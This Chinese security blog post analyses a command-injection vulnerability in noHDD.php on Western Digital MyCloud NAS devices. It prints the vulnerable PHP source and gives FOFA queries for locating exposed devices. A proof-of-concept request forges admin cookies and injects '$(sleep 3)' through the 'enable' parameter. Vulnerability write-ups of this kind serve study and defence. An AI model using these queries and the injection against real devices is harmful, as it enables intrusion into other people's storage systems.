---
title: "西部数码 NAS php/noHDD.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-noHDD-rce.html
asset_dir: assets/西部数码-nas-phpnohdd.php-命令执行漏洞
---

# 西部数码 NAS php/noHDD.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/5 14:38
- 544浏览
- [0评论](#comment)
- 20分钟阅读

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS noHDD.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `noHDD.php` 其业务实现逻辑如下

```
<?php
//$username = $_REQUEST['username'];
//exec("wto -n \"$username\" -g", $ret);
//sscanf($ret[0], "timeout : %d", $timeout_val);
//$res = array();
//exec("xmldbc -g /system_mgr/idle/time", $res);
//$web_timeout = $res[0]*60;
//
//if ($timeout_val == -1 || strlen($username)==0 || $timeout_val >= $web_timeout)
//{
//  header('Content-type: text/xml');
//  echo "<info><status>timeout</status><timeout>$timeout_val</timeout><u>$username</u></info>";
//  return;
//}
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");
$r->chk = login_check();
$r->isAdmin = $_SESSION['isAdmin'];
$r->n = $_SESSION['username'];
/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() == 0)
{
    echo json_encode($r);
    exit;
}

$cmd = $_REQUEST['cmd'];
$enable = $_REQUEST['enable'];  //enable or disable

switch ($cmd) {
    case "getDiskStatus":
       getDiskStatus();
       break;
    case "setSataPower":
       setSataPower($enable);
       break;
}
function setSataPower($enable)
{
    $state = "ok";
    if(file_exists("/tmp/system_ready"))
    {
       $setCmd = "sata_power.sh \"$enable\"";
    exec($setCmd,$retval);
    }
```

当`cmd=setSataPower`时，从请求中获取 `enable` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 $setCmd中，然后用`exec()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞扫描服务

# 漏洞复现

```
GET /web/php/noHDD.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin

cmd=setSataPower&enable=$(sleep 3)
```

[![西部数码 NAS php/noHDD.php 命令执行漏洞](images/img-001-ff99796c4ce6.webp)](https://image.mrxn.net/fdb2c0e3847a47db8d39f5d232e880b2.webp)

成功延时 3 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKNklEQVR4AeyagXYjqQ5Ec/f//3mfq3UKZFBjOztJ99tlTjQlqgpBUGM7mfnr6+vr738afw9/3q2Xp1VzrFvz+AxXvkqrONe2ltFahdn3T3I15DF/f93lBFpDHl3/+iSqbwD4Ap7q2Jdrm8toPXNjDlEfaBJwrAl93SY+Egj9kR5fEGPgGJ/95f1kPPOOfJ7zTp7nt4ZkcufXncDUEKA9cTDnn27VTwj0WuaqWtaEEHOUKyp/5iD8mRtz1XFYg5gHmHo6g0amBDg8iZpSCA/UOE14EFNDHtz+uvAEdkMuPPxq6V9riF8mhBBXOG8IgoOO8iqyzzmET/oYEBr0N3p7PD+jNaF55Q5zGVda9n2a/1pDPt3Yf9X/4w2B/rRC5NXTZS7jqin2ZQ9E/cyNOYQHGKVbjH+mIbf41v4/N7EbcrO+TQ3xS8EZfrr/qg5w+hkeQgPaUsDhz7UguGZ6JNYf6fQFs38ynRAwz4WZG6d7P2c4+jWeGiJyx3Un0BoC0XF4D9/dMkS9V34IX36a4JmDGEP/OAude7WG9Fxf4zEg6o38J2OIGvAe5tqtIZnc+XUnsBty3dmXK/+Vr/B3c1f2fOhX1VqF0H3V3JHzWAgxt6or3THqEPOAJgHHhwagcVUCnPq83j/FfUOqk7+QmxoC50+B9gldhzqvnhLNdaz0rNlfYfY5h9hP5V9xni+sfOIVlQbzmhAcvIe57tSQLN4s/09spzUEopvVdw2hQf+4qSfG4TnjWDzEXOUOCA7eQ9eF2e+aGeHc51pCz4HuN5cRQs+cc9VReJxR/BiVnrnWkEzu/LoT2A257uzLlf+C8+sIrzWgLGzSVxaYPjJae4UQc7PP9SE0wNTT/3rxHIvAtA9rGaH7xhrymYPug8ilKyDG0FG8AzoPke8b4tO5CbYfDD/dj5+QjBBdhhlzfc+B7rMOnYPIK7+5Cl1LCM81xDk81+OM1oQQNbIOz5x8Y2S/89EzjvcN8UndBHdDbtIIb2P5pm5TRoirCh2tj9dP40ozV6HmOEbdvBD6+nCey6sYa+Wx9DE+0eWFvgeNFWNNjcWvYt+Q1elcoE0NURfHqPaVPdCfDuDJbl8mgeOj5yvOOsx+a66f0ZoQYi4EZh8EJ98q4LXvVV04rwGhAV9TQ772n0tPYDfk0uOfF/+4Ib6a0K/ZWBZmDTrnGhldA2aftVcIMTf78hrKKw1iHpDlj3LgeBmG/gvYqgB0H0SefR83JE/e+Z8/gdYQPT0KiK5Bx2pZeR3Wx7H5T9A1hBB7UK6AGEP9FMqjqNaDPheec81xVHPNQZ9n7l10/YzV3NaQStzc75/Absjvn/lyxemXi6+ulKvBfH0hOHuEcM5BaICsL+Pdva18WXMOtDfkahP2VVj5Kw5ijUrL3L4h+TT+XP7tStPvsiA6CbSi+ckAjqcpczaa8/gMK1/FeT7Emh6fIYQPZlzVz/VgnmsdzjV7hBA+5WNAaMAoHeN9Q45juM9f7T0EmJ786qkyB+GH/hEUgrPnDGH2QXDQcTwm6BpEPno0rtaFc7/mjJFrjJrGWVcubgyINaGfUfZoniJz+4bk07hBvhtygybkLUxv6lmscohrqKvmgGcOYgw1ui503ZxrZqw0c9BreA50DiKv/BCa52WE0ABPffrfLMDxEg+BzfRIch3nED6PhTBz+4Y8DvBOX8uGQHSw2jCEBjQZOJ6aRjwSPQmfBEQN6Pgoc3xB51zzEIa/rAktKT8Le4QQayhfxVgreyFqQMesO3cN6L5lQzxx4++dwG7I7531Wyu1n0MqtznoV8qcr5vQ3Aqh14DIsx+CUz2HdY8zVpq5jJ5jDmIdqNE+zxOag3oOYMtLBI6XdaD07htSHst15NQQoHVQT8dZwHu+6ltzTeg1Vj5r0P0w5/ZlhGdf1qrce8saRI3M2WfMmnNrwhVnTTg1ROSO605gN+S6sy9XfusndYgrC7QiuoYO4HiZa2JK4FxLtvZTcObG3OudIcRa0HGsUY1zPYi52Wc9c/Dss0doH4QHMHWcE/CEmuPYN6Qd1T2S5cdeiE66e0JvG0KD/qtlCM6ejJrryPw7OURdWKNreZ2M1jJaz9wqt184+qDvbdTOxqqjyPq+Ifk0bpC39xB1SpH3pLEic87FO0YO+tNiD3Ru9MsDoVvLKP2dyHPGvJpvD8Ta0G+7NSF0HSJ3PekKj4UaK5Q7NFZ4LNRYAVETuOI/W3/tP4sT2C9Zi8O5QpoaoqvkgH6V4DxfbRxiXvbAzGXdOTz7IMbQ0V6h963cAd0LdW6vEMKj/LtR7cO1IOoDpp5wasiTuge/fgLTx16g/dBSddpcRog53n3Wqtw+iHmAqbY2dK6JKXFd4GkOPI/TlCl1jUl4g4BYx1aIMdRon9cUQniVO/YN8UndBHdDbtIIb6M1BOL6WHiFEH6gWYHj5aMRHyS+shWuymS/fZlzbq1Ce4SvdHly2J+5VW6/0D7ljtYQExuvPYFvN8TdFa6+BZhvjeaM8U6NPAeiLnS0XtVaaZU/cxBrZG6Vw+yH4GCN327IakNXaP+WNXdDbtbJ9svF1b583YUwX7lxLnSP5iiyB7oO53mec5artsMemGtas1dorkLoNeRVQOc8B4Lz+Aw1/yzynH1D8mncIG8/qbt71Z4gngKgyfZX2EwpAY6PxEBj89xGFol9hdRqAi3PPs+F0LPmHEIDTLV/UtZ84Kit3GGjxxAe6L/Ch85B5J4nhOBcQ7hviE7mRrEbcqNmaCvtTR3m6wMzp0kKCA1m1NVzyKvwWKjxWUh32AOxhsdCeyqU7oDnuRBjwJanl6dGFglwvHTBjNkOoWdulUP4gf0vhl83+7N8U/fTl/dsrsLscw7RfY+FnguhQX8jlO6A0Cs/hAYdPS+j51ZoH3xew3OruubsyQh9rcq330PyaU357xPTewj0DsJ7+Wrb1VMAUbeaB6EBk+xawklMhHSHaWB6/bdWIXzfX9Uz530JzWXcNySfxg3y3ZAbNCFvoTVEV+iTyEU+zb1ONc+asNLNSR8Dvvcy45oZc+3Mn+Wf+s/qtIacGTb/uycwNQTmpww6t9qenxKY/TBzVS2YfRBc9kNw0NG69yGsOPGKSjMHc11Yc9B1wKVeovbimBrycvY2/OgJ7Ib86PF+XvzHGwIcn/99JYUQ3Ofb7TNUR9GZ9zKItYE2ATj2CPVvDGzUeu+E/Rk9L3POoa//4w3xohv7CayyP9oQiE5XC0JoQJP91AiB4ylVfhYQHuhYedsCjwS6F3gw6y/g2Mfa9XV4ILzAV/7jPWXOObCc+0cb4kU3fv8EdkO+f3Y/MnNqiK/bGa524TnZYy6jdejX11xG6Dr0N9xcC7onz3Vu7zgW/y4nr8L+jOIVMO9DvMNzPD7DqSGeuPGaE2gNgd5heJ2vtpu7X/msV1rFVX6IPWY/BAcds64cuua60Dl5zgJmHwTnWkLPh9AAU09v6CaBxreGWNx47Qnshlx7/tPq/wMAAP//am3xKQAAAAZJREFUAwC/uHah4IrXBAAAAABJRU5ErkJggg==)

手机扫码阅读
